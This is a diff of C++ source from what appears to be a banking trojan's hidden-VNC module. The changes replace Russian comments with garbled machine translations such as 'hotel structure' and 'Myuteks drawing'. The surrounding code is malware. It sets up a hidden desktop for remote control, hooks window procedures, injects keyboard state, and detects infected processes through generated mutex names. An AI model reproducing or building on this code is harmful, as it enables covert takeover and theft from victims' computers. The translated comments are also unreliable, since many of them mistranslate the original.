@@ -43,11 +43,11 @@
 */
 #if(BO_VNC > 0)
 
-VNCPROCESSDATA vncActiveProcessData; //Заполнена только при (coreData.proccessFlags & Core::CDPF_VNC_ACTIVE).
+VNCPROCESSDATA vncActiveProcessData; //Filled only when (coreData.proccessFlags & Core:: CDPF_VNC_ACTIVE).
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Подстройки под оконные классы.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//В Fitting for a window class.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 const static struct {LPWSTR windowClass; int windowClassLenght; WORD method;} winowPrintTypes[] =
 {
@@ -93,7 +93,7 @@ WORD getWindowClassFlags(HWND window)
 
   if(classNameLen > 0)for(DWORD i = 0; i < sizeof(winowPrintTypes) / sizeof(winowPrintTypes[0]); i++)
   {
-    //FIXME: сравнивать без учета регистра.
+    //FIXME: compare case-insensitive.
     if(Str::_CompareW(className, winowPrintTypes[i].windowClass, classNameLen, winowPrintTypes[i].windowClassLenght) == 0)
     {
       return winowPrintTypes[i].method;
@@ -102,9 +102,9 @@ WORD getWindowClassFlags(HWND window)
   return 0;
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Утилиты.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//В Utilities.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
   Инициализация vncProcessData. freeVncProcessData() должна быть вызвона в не зависимости от Return.
@@ -124,15 +124,15 @@ static bool createVncProcessData(VNCPROCESSDATA *vncProcessData, bool isServer)
   //TLS.
   if((vncProcessData->tlsPaintIndex = CWA(kernel32, TlsAlloc)()) == TLS_OUT_OF_INDEXES)return false;
 
-  //Сообшение рисования.
+  //Your Message draw.
   Core::generateObjectName(Core::OBJECT_ID_VNC_MESSAGE, name, MalwareTools::KON_DEFAULT);
   if((vncProcessData->vncMessage = CWA(user32, RegisterWindowMessageW)(name)) == 0)return false;
   
-  //Событие vncMessage.
+  //Event vncMessage.
   Core::generateObjectName(Core::OBJECT_ID_VNC_EVENT, name, MalwareTools::KON_SESSION);
   if((vncProcessData->vncMessageEvent = CWA(user32, CreateEventW)(&coreData.securityAttributes.saAllowAll, TRUE, FALSE, name)) == NULL)return false;
   
-  //Глобальные данные.
+  //Global data.
   {
     Core::generateObjectName(Core::OBJECT_ID_VNC_GLOBALDATA_MUTEX, name, MalwareTools::KON_SESSION);
     if((vncProcessData->globalDataMutex = CWA(kernel32, CreateMutexW)(&coreData.securityAttributes.saAllowAll, FALSE, name)) == NULL)return false;
@@ -165,7 +165,7 @@ static bool createVncProcessData(VNCPROCESSDATA *vncProcessData, bool isServer)
 
       if(vncProcessData->dib.tempHandle != NULL)
       {
-        //Вычисляем различные переменные.
+        //Calculate the different variables.
         vncProcessData->dib.pixelSize    = bitmapInfo->bmiHeader.biBitCount / 8;
         vncProcessData->dib.widthInBytes = vncProcessData->dib.rect.right * vncProcessData->dib.pixelSize;
         vncProcessData->dib.widthInBytes = ALIGN_UP(vncProcessData->dib.widthInBytes, sizeof(DWORD));
@@ -176,12 +176,12 @@ static bool createVncProcessData(VNCPROCESSDATA *vncProcessData, bool isServer)
     }      
   }
 
-  //Серверная часть.
+  //The server part.
   if(retVal == true && isServer == true)
   {
     retVal = false;
         
-    //Данные необходимые для обнаружения зараженных процессов.
+    //Data necessary to detect infected processes.
     {
       BASECONFIG baseConfig;
       PESETTINGS pes;
@@ -194,7 +194,7 @@ static bool createVncProcessData(VNCPROCESSDATA *vncProcessData, bool isServer)
       Mem::_copy(&vncProcessData->serverData.processDetectionData.baseKey, &baseConfig.baseKey, sizeof(Crypt::RC4KEY));
     }
 
-    //Мютекс рисования.
+    //Myuteks drawing.
     Core::generateObjectName(Core::OBJECT_ID_VNC_PAINT_MUTEX, name, MalwareTools::KON_SESSION);
     if((vncProcessData->serverData.dcData.paintMutex = CWA(kernel32, CreateMutexW)(&coreData.securityAttributes.saAllowAll, FALSE, name)) == NULL)return false;
     
@@ -237,11 +237,12 @@ static void freeVncProcessData(VNCPROCESSDATA *vncProcessData, bool isServer)
     if(vncProcessData->serverData.dcData.dc != NULL)CWA(gdi32, DeleteDC)(vncProcessData->serverData.dcData.dc);
     if(vncProcessData->serverData.dcData.paintMutex != NULL)CWA(kernel32, CloseHandle)(vncProcessData->serverData.dcData.paintMutex);
 
-    //Закрываем дочерный процесс.
+    //Closes the child process.
     if(vncProcessData->serverData.paintProcess.hThread != NULL && CWA(kernel32, WaitForSingleObject)(vncProcessData->serverData.paintProcess.hThread, 0) != WAIT_TIMEOUT)
     {
       CWA(user32, PostThreadMessageW)(vncProcessData->serverData.paintProcess.dwThreadId, WM_QUIT, 0, 0);
-      //CWA(kernel32, TerminateProcess)(vncProcessData->serverData.paintProcess.hProcess, 0);
+      //CWA (kernel32, TerminateProcess) (vncProcessData-> serverData.paintProcess.hProcess, 0);
+
     }
     Process::_closeProcessInformation(&vncProcessData->serverData.paintProcess);
   }
@@ -273,7 +274,7 @@ WORD updateInputState(VNCPROCESSDATA *vncProcessData, BYTE virtualKey, bool down
     }
   }
 
-  //CWA(user32, SetKeyboardState)(p); //Нет смысла.
+  //CWA (user32, SetKeyboardState) (p); / / It makes no sense.
 
   WORD mouseState = 0;
 
@@ -291,7 +292,7 @@ bool isWindowInfected(VNCPROCESSDATA *vncProcessData, HWND window)
   DWORD pid;
   if(CWA(user32, GetWindowThreadProcessId)(window, &pid) > 0)
   {
-    //Копия Core::createMutexOfProcess().
+    //A copy of the Core:: createMutexOfProcess ().
     WCHAR objectName[50];
     MalwareTools::_generateKernelObjectName(&vncProcessData->serverData.processDetectionData.osGuid,
                                             vncProcessData->serverData.processDetectionData.processInfecionId,
@@ -304,7 +305,7 @@ bool isWindowInfected(VNCPROCESSDATA *vncProcessData, HWND window)
   return false;
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 void VncServer::init(void)
 {
@@ -340,9 +341,9 @@ void VncServer::uninit(void)
   if(coreData.proccessFlags & Core::CDPF_VNC_ACTIVE)freeVncProcessData(&vncActiveProcessData, false);
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Сервер.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//В Server.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 static void onSecurityType(void *param, LPDWORD securityType, LPSTR *errorMessage)
 {
@@ -393,7 +394,7 @@ bool VncServer::start(SOCKET s)
 {
   CWA(kernel32, SetThreadPriority)(CWA(kernel32, GetCurrentThread)(), THREAD_PRIORITY_ABOVE_NORMAL);
   
-  //Создаем/подключаемся к десктопу.
+  //Create / connect to the desktop.
   WCHAR vncDesktop[50];  
   Core::generateObjectName(Core::OBJECT_ID_VNC_DESKTOP, vncDesktop, MalwareTools::KON_DEFAULT);
   if(!WindowStation::_setThreadDesktopEx(NULL, vncDesktop))
@@ -402,8 +403,8 @@ bool VncServer::start(SOCKET s)
     return false;
   }
 
-  //Инициализация данных.
-  VNCPROCESSDATA vncProcessData; //Для каждой сессии создаем отельную структуру.
+  //Initialization data.
+  VNCPROCESSDATA vncProcessData; //For each session, creating a hotel structure.
   if(!createVncProcessData(&vncProcessData, true))
   {
     WDEBUG0(WDDT_ERROR, "createVncProcessData() failed.");
@@ -413,7 +414,7 @@ bool VncServer::start(SOCKET s)
 
   bool retVal = (CWA(kernel32, GetShellWindow)() != NULL);
 
-  //Создаем "root" процесс.
+  //Create a "root" process.
   if(retVal == false)
   {
     WCHAR rootModule[MAX_PATH];
@@ -431,7 +432,7 @@ bool VncServer::start(SOCKET s)
       {
         WDEBUG1(WDDT_INFO, "Root process created, pid=%u.", processInfo.dwProcessId);
 
-        CWA(kernel32, WaitForSingleObject)(processInfo.hProcess, 5000);//Немного подождем пока все загрузится.
+        CWA(kernel32, WaitForSingleObject)(processInfo.hProcess, 5000);//Wait for a while until everything is loaded.
         CWA(kernel32, CloseHandle)(processInfo.hThread);
         CWA(kernel32, CloseHandle)(processInfo.hProcess);
         retVal = true;
@@ -439,14 +440,14 @@ bool VncServer::start(SOCKET s)
     }
   }
 
-  //Изменяем некотрые системные параметры.
+  //Change nekotrye system parameters.
   {
-    //Отключаем анимацию меню.
+    //Disable menu animation.
     CWA(user32, SystemParametersInfoW)(SPI_SETMENUANIMATION, 0, (void *)FALSE, 0);
-    //SPI_SETMOUSECLICKLOCK и т.д.
+    //SPI_SETMOUSECLICKLOCK etc.
   }  
   
-  //Запускаем сессию.
+  //Start the session.
   if(retVal == true)
   {
     Rfb::SERVER_CALLBACKS sc;
@@ -463,7 +464,7 @@ bool VncServer::start(SOCKET s)
     Rfb::_ServerThread(s, 30 * 60 * 1000, &sc, vncProcessData.mapFileHandle, sizeof(VNCGLOBALDATA), vncProcessData.serverData.dcData.paintMutex, 300);
   }
 
-  //Освобождаем ресурсы.
+  //Free resources.
   freeVncProcessData(&vncProcessData, true);
   return retVal;
 }
@@ -475,7 +476,7 @@ static LRESULT vncMessage(HWND window, WPARAM wParam, LPARAM lParam)
 {
   switch(wParam)
   {
-    //Хак меню окна.
+    //Hack window menu.
     case VMW_EXECUTE_MENU:
     case VMW_HILITE_MENU:
     {
@@ -486,7 +487,7 @@ static LRESULT vncMessage(HWND window, WPARAM wParam, LPARAM lParam)
         break;
       }
       
-      //Снимаем подсветку со всех пункутов.
+      //Remove highlighting from all punkutov.
       int lastHiliteItem = -1;
       int itemsCount = CWA(user32, GetMenuItemCount)(menu);
       for(int i = 0; i < itemsCount; i++)if(CWA(user32, GetMenuState)(menu, i, MF_BYPOSITION) & MF_HILITE)
@@ -495,7 +496,7 @@ static LRESULT vncMessage(HWND window, WPARAM wParam, LPARAM lParam)
         lastHiliteItem = i;
       }
 
-      //Получаем элемент.
+      //Obtain the item.
       int item = CWA(user32, MenuItemFromPoint)(window, menu, vncActiveProcessData.globalData->cursorPoint);
       if(item == -1)break;
 
@@ -505,7 +506,7 @@ static LRESULT vncMessage(HWND window, WPARAM wParam, LPARAM lParam)
 
       if(wParam == VMW_HILITE_MENU || itemState & (MF_DISABLED | MF_GRAYED))break;
       
-      //Запуск подменю.
+      //Run the submenu.
       if(itemState & MF_POPUP)
       {
         HMENU popupMenu = CWA(user32, GetSubMenu)(menu, item);
@@ -515,7 +516,7 @@ static LRESULT vncMessage(HWND window, WPARAM wParam, LPARAM lParam)
           CWA(user32, TrackPopupMenuEx)(popupMenu, TPM_LEFTALIGN | TPM_TOPALIGN | TPM_LEFTBUTTON | TPM_NOANIMATION | TPM_HORIZONTAL, itemRect.left, itemRect.bottom, window, NULL);
         }
       }
-      //Исполнение пункта.
+      //Pursuant to paragraph.
       else
       {
         UINT id = itemState & MF_SEPARATOR ? 0 : CWA(user32, GetMenuItemID)(menu, item);
@@ -524,12 +525,12 @@ static LRESULT vncMessage(HWND window, WPARAM wParam, LPARAM lParam)
       break;
     }
 
-    //Обновление состояния клавиш.
+    //Update state of keys.
     case VMW_UPDATE_KEYSTATE:
       CWA(user32, SetKeyboardState)(vncActiveProcessData.globalData->keysState);
       break;
     
-    //Рисование.
+    //Drawing.
     default:
     {
       RECT visibleRect;
@@ -565,7 +566,7 @@ BOOL WINAPI VncServer::hookerSwitchDesktop(HDESK desktop)
   return CWA(user32, SwitchDesktop)(desktop);
 }
 
-//Пролог для Def*Proc.
+//Prologue for Def * Proc.
 #define DEFPROC_PROLOG(window) {if(IS_VNC_PROCESS && msg == vncActiveProcessData.vncMessage)return vncMessage(window, wParam, lParam);}
 
 LRESULT WINAPI VncServer::hookerDefWindowProcW(HWND window, UINT msg, WPARAM wParam, LPARAM lParam)
@@ -628,19 +629,17 @@ LRESULT WINAPI VncServer::hookerCallWindowProcA(WNDPROC prevWndFunc, HWND window
   return CWA(user32, CallWindowProcA)(prevWndFunc, window, msg, wParam, lParam);
 }
 
-/*
-  Замена Def*Proc на хук.
+/*В В Replacement Def * Proc on a hook.
 
-  IN p   - адрес для проверки.
+В В IN p - address for verification.
 
-  Return - адрес хука -  если хук найден. NULL - хук не найден.
-*/
+В В Return - address hook - if the hook is found. NULL - the hook is not found.*/
 static void *replaceDefProc(void *p)
 {
   if(p == CWA(user32, DefWindowProcW))return VncServer::hookerDefWindowProcW;
   if(p == CWA(user32, DefWindowProcA))return VncServer::hookerDefWindowProcA;
   
-  //За эти функции не уверен.
+  //For these functions are not sure.
   if(p == CWA(user32, DefMDIChildProcW))return VncServer::hookerDefMDIChildProcW;
   if(p == CWA(user32, DefMDIChildProcA))return VncServer::hookerDefMDIChildProcA;
 
